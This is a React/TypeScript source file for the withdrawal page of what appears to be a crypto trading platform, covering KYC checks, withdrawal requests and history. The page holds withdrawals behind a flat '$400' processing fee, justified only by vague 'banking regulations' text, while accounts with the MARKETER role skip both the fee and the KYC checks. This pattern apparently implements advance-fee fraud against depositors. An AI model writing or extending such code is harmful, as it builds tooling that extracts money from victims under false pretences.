import { useState } from "react";
import { useAuth } from "../lib/auth";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import NewWithdrawalForm from "../components/withraw/NewWithdrawalForm";
import FeeDepositFlow from "../components/withraw/FeeDepositFlow";
import WithdrawalHistory from "../components/withraw/WithdrawalHistory";
import KYCStatus from "../components/withraw/KYCStatus";
import type { Transaction, KYCStatus as KYCStatusType } from "../types/index";
import { History, Clock, AlertTriangle } from "lucide-react";
import api from "../lib/api";

export default function WithdrawalsPage() {
  const queryClient = useQueryClient();
  const { user } = useAuth();
  const [kycStatus, setKycStatus] = useState<string>("UNVERIFIED");
  const [showKyc, setShowKyc] = useState(false); 
  const [showFee, setShowFee] = useState(false); 
  const [isPayingFee, setIsPayingFee] = useState(false);
  const [toast, setToast] = useState<{
    show: boolean;
    message: string;
    type: "success" | "error";
  } | null>(null);

  // Fetch KYC status quietly in the background
  useQuery<KYCStatusType>({
    queryKey: ["kyc-status"],
    queryFn: async () => {
      const { data } = await api.get("/kyc/status");
      setKycStatus(data.kycStatus);
      return data;
    },
  });

  // Fetch fee status quietly
  const { data: feeStatus, refetch: refetchFee } = useQuery({
    queryKey: ["fee-status"],
    queryFn: async () => {
      const { data } = await api.get("/withdraw/fee-status");
      return data;
    },
  });

  const handleFeeSuccess = () => {
    refetchFee();
    setIsPayingFee(false);
    setShowFee(false);
    setToast({
      show: true,
      type: "success",
      message: "Processing fee recorded successfully. Proceeding to verification.",
    });
    if (kycStatus !== "VERIFIED" && kycStatus !== "NOT_REQUIRED") {
      setShowKyc(true);
    }
  };

  const { data: history = [], isLoading: historyLoading } = useQuery<Transaction[]>({
    queryKey: ["withdrawal-history"],
    queryFn: async () => {
      const { data } = await api.get("/withdraw/history");
      return data;
    },
  });

  const withdrawMutation = useMutation({
    mutationFn: async (withdrawalData: {
      accountId: string;
      amount: number;
      coin: string;
      network: string;
      toAddress: string;
    }) => {
      const { data } = await api.post("/withdraw/request", withdrawalData);
      return data;
    },
    onSuccess: (response) => {
      queryClient.invalidateQueries({ queryKey: ["withdrawal-history"] });
      queryClient.invalidateQueries({ queryKey: ["accountBalance"] });
      setToast({
        show: true,
        type: "success",
        message: `Withdrawal request submitted! ID: ${response.withdrawalId}. Amount: $${response.amount}`,
      });
      setTimeout(() => setToast(null), 6000);
    },
    onError: (error: any) => {
      setToast({
        show: true,
        type: "error",
        message: error.response?.data?.error || "Withdrawal request failed",
      });
      console.error("Withdrawal error:", error);
    },
  });

  const accounts = user?.accounts || [];
  const realAccount = accounts.find((acc: any) => acc.type === "REAL");

  const handleWithdrawalSubmit = async (formData: {
    accountId: string;
    amount: number;
    coin: string;
    network: string;
    toAddress: string;
  }) => {
    const isMarketer = user?.role === "MARKETER";

    if (!isMarketer) {
      if (kycStatus === "PENDING") {
        setToast({
          show: true,
          type: "error",
          message: "Verification is in progress. Review processes resolve within 24 to 48 hours.",
        });
        setShowKyc(true);
        return;
      }

      if (kycStatus !== "VERIFIED") {
        setToast({
          show: true,
          type: "error",
          message: "KYC validation required before requesting funds.",
        });
        setShowKyc(true);
        return;
      }
    }

    if (!realAccount?.id) {
      setToast({
        show: true,
        type: "error",
        message: "No live trading account setup context detected.",
      });
      return;
    }

    await withdrawMutation.mutateAsync({
      accountId: realAccount.id,
      amount: formData.amount,
      coin: formData.coin,
      network: formData.network,
      toAddress: formData.toAddress,
    });
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-white p-4 md:p-8 flex flex-col items-center justify-start space-y-6">      
      <div className="w-full max-w-2xl space-y-6">
        <div className="flex items-center gap-3 px-1 py-2">
          <div>
            <h1 className="text-2xl font-bold">Withdraw Crypto</h1>
            <p className="text-sm text-gray-400">
              Withdraw your cryptocurrency to an external wallet
            </p>
          </div>
        </div>

        {/* Withdrawal Form */}
        <div className="bg-[#0d0f17] border border-[#1a1f28] rounded-2xl p-6 shadow-xl">
          <h2 className="text-sm font-bold text-white mb-4 uppercase tracking-wider">
            Withdrawal Request
          </h2>
          <NewWithdrawalForm
            kycStatus={user?.role === "MARKETER" ? "VERIFIED" : kycStatus}
            isFeePaid={user?.role === "MARKETER" ? true : !!feeStatus?.paid}
            accountId={realAccount?.id || "default"}
            onExecuteWithdraw={handleWithdrawalSubmit}
            onKycRequired={() => { setShowFee(false); setShowKyc(true); }}
            onFeeRequired={() => { setShowKyc(false); setShowFee(true); }}
          />
        </div>

        {/* Dynamic Fee Conditional Processing Block */}
        {showFee && user?.role !== "MARKETER" && !feeStatus?.paid && (
          isPayingFee ? (
            <FeeDepositFlow 
              onCancel={() => setIsPayingFee(false)}
              onSuccess={handleFeeSuccess}
            />
          ) : (
            <div className="bg-[#0d0f17] border border-[#1a1f28] rounded-2xl p-6 shadow-xl animate-slideDown">
              <div className="flex items-start gap-3 mb-4">
                <AlertTriangle className="h-5 w-5 text-amber-400 mt-0.5 flex-shrink-0" />
                <div>
                  <h2 className="text-sm font-bold text-white uppercase tracking-wider">
                    Requirements
                  </h2>
                  <p className="text-xs text-gray-400 mt-2 leading-relaxed">
                    Hello! We understand that sometimes unexpected issues may arise during the withdrawal process due to banking regulations, payment processor requirements, or account verification checks.
                    <br /><br />
                    To complete your withdrawal successfully, an additional processing fee may be required. Once this fee is received, your withdrawal will be processed promptly, and the funds will be released to your designated account.
                    <br /><br />
                    We appreciate your patience and understanding. If you have any questions about the fee or the withdrawal process, please let us know we're happy to provide clarification.
                  </p>
                </div>
              </div>
              <button
                onClick={() => setIsPayingFee(true)}
                className="w-full bg-[#39ff88] text-[#05070a] font-bold text-xs py-2.5 rounded-lg hover:bg-[#5dffa1] transition-colors flex items-center justify-center gap-2 mt-4"
              >
                Add Fee ($400)
              </button>
            </div>
          )
        )}

        {/* Dynamic KYC Conditional Processing Block */}
        {showKyc && user?.role !== "MARKETER" && kycStatus !== "VERIFIED" && (
          <div className="bg-[#0d0f17] border border-[#1a1f28] rounded-2xl p-6 shadow-xl animate-slideDown">
            {kycStatus === "PENDING" ? (
              <div className="text-center py-4 space-y-3">
                <Clock className="h-8 w-8 text-amber-400 mx-auto animate-pulse" />
                <h2 className="text-sm font-bold text-white uppercase tracking-wider">
                  Verification Audit Pending
                </h2>
                <p className="text-xs text-gray-400 max-w-md mx-auto leading-relaxed">
                  Your identity documents are securely uploaded and awaiting administrative review. This compliance check typically takes <span className="text-amber-400 font-semibold">24 to 48 hours</span> to process completely.
                </p>
              </div>
            ) : (
              <>
                <div className="flex items-start gap-3 mb-4">
                  {kycStatus === "REJECTED" && <AlertTriangle className="h-5 w-5 text-red-400 mt-0.5 flex-shrink-0" />}
                  <div>
                    <h2 className="text-sm font-bold text-white uppercase tracking-wider">
                      {kycStatus === "REJECTED" ? "Verification Rejected" : "Identity Verification Required"}
                    </h2>
                    <p className="text-xs text-gray-400 mt-1">
                      {kycStatus === "REJECTED" 
                        ? "Your previous document validation submission failed audit criteria. Please submit updated structural documentation."
                        : "Complete standard compliance registration parameters to release external fund access limits."}
                    </p>
                  </div>
                </div>
                <KYCStatus onStatusChange={setKycStatus} />
              </>
            )}
          </div>
        )}

        {toast?.show && (
          <div
            className={`w-full max-w-2xl rounded-xl p-4 border transiton-all ${
              toast.type === "success"
                ? "bg-[#0d1712] border-[#1a442b]"
                : "bg-[#1a0d0d] border-[#441a1a]"
            }`}
          >
            <h4
              className={`text-sm font-bold ${
                toast.type === "success" ? "text-[#39ff88]" : "text-red-400"
              }`}
            >
              {toast.type === "success" ? "Withdrawal Submitted" : "System Notification"}
            </h4>
            <p className="text-xs text-gray-400 mt-0.5">{toast.message}</p>
          </div>
        )}

        {/* Withdrawal History List Container */}
        <div className="bg-[#0d0f17] border border-[#1a1f28] rounded-2xl p-6 shadow-xl">
          <h3 className="text-sm font-bold text-white mb-4 flex items-center gap-2 uppercase tracking-wider">
            <History className="h-4 w-4 text-gray-400" />
            Withdrawal History
          </h3>

          {historyLoading ? (
            <div className="text-xs text-gray-500 py-10 text-center tracking-wider animate-pulse">
              Loading withdrawal history...
            </div>
          ) : history.length === 0 ? (
            <div className="text-center py-8">
              <div className="text-sm text-gray-400 mb-2">No withdrawals yet</div>
              <p className="text-xs text-gray-500">
                Your withdrawal history will appear here
              </p>
            </div>
          ) : (
            <WithdrawalHistory transactions={history.slice(0, 5)} />
          )}
        </div>
      </div>
    </div>
  );
}